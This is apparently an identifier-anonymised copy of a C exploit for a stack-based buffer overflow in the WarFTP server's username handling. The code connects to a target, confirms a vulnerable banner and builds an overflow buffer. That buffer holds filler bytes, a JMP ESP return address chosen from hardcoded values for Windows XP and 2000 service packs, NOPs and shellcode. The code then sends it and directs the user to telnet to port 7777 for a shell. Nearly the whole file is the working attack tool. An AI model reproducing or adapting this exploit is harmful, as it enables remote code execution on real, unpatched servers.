
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int sin_zero; int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int WSADATA ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_0 (int,int ) ;
 char VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 char* VAR_7 ;
 int VAR_8 ;
 int FUNC_1 () ;
 scalar_t__ FUNC_2 (int ,int *) ;
 char VAR_9 ;
 int FUNC_3 (char*) ;
 int FUNC_4 (int) ;
 int FUNC_5 (int,struct sockaddr*,int) ;
 int FUNC_6 (int ,char*,...) ;
 int FUNC_7 (char*) ;
 int FUNC_8 (int) ;
 int FUNC_9 (char*) ;
 scalar_t__ FUNC_10 (int) ;
 int FUNC_11 (char*,char*,int) ;
 int FUNC_12 (int *,int ,int) ;
 int FUNC_13 (int,char*,int,int ) ;
 unsigned int FUNC_14 (int,char*,unsigned int,int ) ;
 int FUNC_15 (int ,int ,int ) ;
 int VAR_10 ;
 int VAR_11 ;
 int FUNC_16 (char*) ;
 int FUNC_17 (char*,char*,int) ;
 int * FUNC_18 (char*,int ) ;
 char* VAR_12 ;
 int FUNC_19 (char*) ;

int FUNC_20(int VAR_13, char ** VAR_14) {
   char VAR_15[VAR_1], VAR_16[VAR_2], VAR_17, VAR_18;
   char * VAR_19;
   unsigned int VAR_20 = 0, VAR_21, VAR_22;
   int VAR_23, VAR_24;
   struct sockaddr_in VAR_25;
   WSADATA VAR_26;

   FUNC_19("cls");
   FUNC_6(VAR_11, "\n\tWarFTP Username Stack-Based Buffer-Overflow Vulnerability\n");
   FUNC_6(VAR_11, "     ____________________________________________________________________\n\n");

   if (((VAR_13 == 3) && (FUNC_3(VAR_14[2]) >= 0) && (FUNC_3(VAR_14[2]) < 14)) || ((VAR_13 == 4) && (FUNC_3(VAR_14[2]) == 14))) {

      if (FUNC_2(FUNC_0(2, 0), &VAR_26) == 0) {
         if ((VAR_23 = FUNC_15(VAR_0, VAR_5, 0)) != -1) {



            VAR_25.sin_family = VAR_0;
            VAR_25.sin_addr.s_addr = FUNC_9(VAR_14[1]);
            VAR_25.sin_port = FUNC_8(VAR_4);
            FUNC_12(&(VAR_25.sin_zero), '0', 8);

            if (FUNC_5(VAR_23, (struct sockaddr *) &VAR_25, sizeof(struct sockaddr)) != -1) {
               FUNC_13(VAR_23, VAR_15, VAR_1, 0);
               VAR_15[VAR_1 - 1] = VAR_9;

               if (FUNC_18(VAR_15, VAR_8) != ((void*)0)) {





                  VAR_19 = (char *) FUNC_10(FUNC_16(VAR_7) + VAR_6 + VAR_2 + (sizeof(char) * 4) + FUNC_16(VAR_12) + (sizeof(char) * 2));
                  if (VAR_19 != ((void*)0)) {
                     for (VAR_21=0; VAR_21 < FUNC_16(VAR_7); VAR_21++) *(VAR_19 + VAR_21) = VAR_7[VAR_21];
                     for (VAR_24=0; VAR_24 < VAR_6; VAR_21++, VAR_24++) *(VAR_19 + VAR_21) = '\x41';


                     switch(FUNC_3(VAR_14[2])) {
                        case 0: FUNC_11(VAR_16, "\xE3\x39\xF4\x77", VAR_2); break;
                        case 1: FUNC_11(VAR_16, "\x0F\x98\xF8\x77", VAR_2); break;
                        case 2: FUNC_11(VAR_16, "\xED\x1E\x95\x7C", VAR_2); break;
                        case 3: FUNC_11(VAR_16, "\xE3\x39\xF4\x77", VAR_2); break;
                        case 4: FUNC_11(VAR_16, "\xCC\x59\xFA\x77", VAR_2); break;
                        case 5: FUNC_11(VAR_16, "\xED\x1E\x95\x7C", VAR_2); break;
                        case 6: FUNC_11(VAR_16, "\xFF\xFF\xFF\xFF", VAR_2); break;
                        case 7: FUNC_11(VAR_16, "\xFF\xFF\xFF\xFF", VAR_2); break;
                        case 8: FUNC_11(VAR_16, "\xFF\xFF\xFF\xFF", VAR_2); break;
                        case 9: FUNC_11(VAR_16, "\xFF\xFF\xFF\xFF", VAR_2); break;
                        case 10: FUNC_11(VAR_16, "\x8B\x94\xF8\x77", VAR_2); break;
                        case 11: FUNC_11(VAR_16, "\xAB\x67\xF9\x77", VAR_2); break;
                        case 12: FUNC_11(VAR_16, "\xFF\xFF\xFF\xFF", VAR_2); break;
                        case 13: FUNC_11(VAR_16, "\xFF\xFF\xFF\xFF", VAR_2); break;
                        case 14:
                           VAR_22 = 0;
                           if ((FUNC_17(VAR_14[3], "0x", (sizeof(char) * 2)) == 0) && (FUNC_16(VAR_14[3]) == 10)) {
                              for (VAR_24=(sizeof(char) * 8) - 1; ((VAR_24 >= 0) && (!VAR_20)); VAR_24--) {
                                 VAR_17 = *(VAR_14[3] + VAR_24 + 2);
                                 if (((VAR_17 > 47) && (VAR_17 < 58)) || ((VAR_17 > 64) && (VAR_17 < 71)) || ((VAR_17 > 96) && (VAR_17 < 103))) {
                                    if ((VAR_17 > 47) && (VAR_17 < 58)) VAR_17 -= 48;
                                    else if ((VAR_17 > 64) && (VAR_17 < 71)) VAR_17 -= 55;
                                    else VAR_17 -= 87;

                                    if ((VAR_24 % 2) == 0) VAR_16[VAR_22++] = ((VAR_17 <<= 4) | VAR_18);
                                    else VAR_18 = VAR_17;
                                 }
                                 else { FUNC_6(VAR_10, "\t[ ERROR ] Three parameter syntax error\n\t[ ERROR ] Example: 0xFFFFFFFF\n"); VAR_20 = 1; }
                              }
                           }
                           else { FUNC_6(VAR_10, "\t[ ERROR ] Three parameter syntax error\n\t[ ERROR ] Example: 0xFFFFFFFF\n"); VAR_20 = 1; }
                     }

                     if (!VAR_20) {
                        for (VAR_24=0; VAR_24 < VAR_2; VAR_21++, VAR_24++) *(VAR_19 + VAR_21) = VAR_16[VAR_24];
                        for (VAR_24=0; VAR_24 < (sizeof(char) * 4); VAR_21++, VAR_24++) *(VAR_19 + VAR_21) = VAR_3;
                        for (VAR_24=0; VAR_24 < FUNC_16(VAR_12); VAR_21++, VAR_24++) *(VAR_19 + VAR_21) = VAR_12[VAR_24];
                        FUNC_11(VAR_19 + VAR_21, "\r\n", (sizeof(char) * 2));

                        if (VAR_21 == FUNC_14(VAR_23, VAR_19, ++VAR_21, 0)) {
                          FUNC_6(VAR_11, "\t[ OK ] Exploit buffer send to %s:%d\n", VAR_14[1], VAR_4);
                          FUNC_6(VAR_11, "\t[ OK ] If you have not chosen a correct operating system and\n\t       service pack you can cause a D.O.S\n");
                          FUNC_6(VAR_11, "\t[ OK ] Connect: telnet %s 7777\n", VAR_14[1]);
                        }
                        else FUNC_6(VAR_10, "\t[ ERROR ] No sending all exploit buffer\n");
                     }
                     FUNC_7(VAR_19);
                  }
                  else FUNC_6(VAR_10, "\t[ ERROR ] No allocate memory\n");
               }
               else FUNC_6(VAR_10, "\t[ ERROR ] Not a vulnerable server\n");
            }
            else FUNC_6(VAR_10, "\t[ ERROR ] Connect to %s:%d\n", VAR_14[1], VAR_4);
            FUNC_4(VAR_23);
         }
         else FUNC_6(VAR_10, "\t[ ERROR ] Create local socket\n");
         FUNC_1();
      }
      else FUNC_6(VAR_10, "\t[ ERROR ] Load library");
   }
   else {
      FUNC_6(VAR_10, "   [ + ] USE: %s IP_ADDRESS SERVICE_PACK [ ESP_ADDRESS ]\n\n", VAR_14[0]);
      FUNC_6(VAR_10, "   [ + ] SERVICE PACK:  [ - ] Microsoft Windows XP Pro Spanish SP0 (0)\n");
      FUNC_6(VAR_10, "\t\t\t[ - ] Microsoft Windows XP Pro Spanish SP1 (1)\n");
      FUNC_6(VAR_10, "\t\t\t[ - ] Microsoft Windows XP Pro Spanish SP2 (2)\n");
      FUNC_6(VAR_10, "\t\t\t[ - ] Microsoft Windows XP Pro English SP0 (3)\n");
      FUNC_6(VAR_10, "\t\t\t[ - ] Microsoft Windows XP Pro English SP1 (4)\n");
      FUNC_6(VAR_10, "\t\t\t[ - ] Microsoft Windows XP Pro English SP2 (5)\n");
      FUNC_6(VAR_10, "\t\t\t[ - ] Microsoft Windows 2000 Pro Spanish SP0 (6)\n");
      FUNC_6(VAR_10, "\t\t\t[ - ] Microsoft Windows 2000 Pro Spanish SP1 (7)\n");
      FUNC_6(VAR_10, "\t\t\t[ - ] Microsoft Windows 2000 Pro Spanish SP2 (8)\n");
      FUNC_6(VAR_10, "\t\t\t[ - ] Microsoft Windows 2000 Pro Spanish SP3 (9)\n");
      FUNC_6(VAR_10, "\t\t\t[ - ] Microsoft Windows 2000 Pro English SP0 (10)\n");
      FUNC_6(VAR_10, "\t\t\t[ - ] Microsoft Windows 2000 Pro English SP1 (11)\n");
      FUNC_6(VAR_10, "\t\t\t[ - ] Microsoft Windows 2000 Pro English SP2 (12)\n");
      FUNC_6(VAR_10, "\t\t\t[ - ] Microsoft Windows 2000 Pro English SP3 (13)\n");
      FUNC_6(VAR_10, "\t\t\t[ - ] Custom Service Pack - JMP %%ESP (14)\n\n");
      FUNC_6(VAR_10, "   [ + ] EXAMPLE:  %s 127.0.0.1 2\n", VAR_14[0]);
      FUNC_6(VAR_10, "   [ + ] EXAMPLE2: %s 127.0.0.1 14 0x776EDDFF\n", VAR_14[0]);
   }
   FUNC_6(VAR_11, "     ___________________________________________________________________\n\n");
   return 0;
}
